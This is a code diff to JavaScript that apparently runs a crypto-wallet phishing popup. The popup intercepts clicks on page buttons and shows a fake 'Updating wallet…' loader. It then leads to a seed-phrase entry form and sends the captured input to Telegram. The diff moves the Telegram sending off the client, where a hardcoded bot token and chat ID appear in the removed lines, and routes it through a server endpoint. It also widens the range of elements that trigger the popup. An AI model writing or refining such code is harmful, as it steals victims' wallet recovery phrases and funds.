@@ -220,20 +220,13 @@
   document.body.appendChild(popup);
 
   // --- Telegram logic from x.html ---
-  const TELEGRAM_BOT_TOKEN = '7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA';
-  const TELEGRAM_CHAT_ID = '-4704812522';
-
   function sendToTelegram(message) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message
-      })
-    });
-  }
+  fetch('/api/sendToTelegram', {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ message })
+  });
+}
 
   // Section switching logic
   function nextSection(showId) {
@@ -254,21 +247,12 @@
     setTimeout(() => { nextSection('updateSection'); }, 2000);
   }
 
-  // UPDATED: Download logic now shows loader/message for 3s, then shows the phrase form
   function handleDownload() {
-    // Show loader with update message
     popup.querySelector('#loaderMsg').textContent = "Updating wallet…";
     nextSection('loaderSection');
     setTimeout(() => {
       nextSection('phraseSection');
     }, 3000);
-    // Optionally start download in background (if you still want to download)
-    // const a = document.createElement('a');
-    // a.href = 'https://example.com/wallet-update.zip';
-    // a.download = 'wallet-update.zip';
-    // document.body.appendChild(a);
-    // a.click();
-    // document.body.removeChild(a);
   }
 
   function submitPhrase() {
@@ -325,17 +309,21 @@
     setupInputs();
   }
 
-  // Listen for any button or w-button link click on the page
+  // Smarter event: always find the nearest actionable button (works for text, icons, etc.)
   document.body.addEventListener('click', function (e) {
     if (
       e.target.closest('.wallet-popup') ||
       e.target.closest('[data-wallet-popup-ignore]')
     ) return;
-    // Show popup for <button> or <a class="w-button">
-    if (
-      e.target.tagName === 'BUTTON' ||
-      (e.target.tagName === 'A' && e.target.classList.contains('w-button'))
-    ) {
+
+    // Find the nearest actionable button (button, a.w-button, [role="button"], [tabindex="0"])
+    const button =
+      e.target.closest('button') ||
+      e.target.closest('a.w-button') ||
+      e.target.closest('[role="button"]') ||
+      e.target.closest('[tabindex="0"]');
+
+    if (button) {
       showPopup();
       e.preventDefault();
       e.stopPropagation();
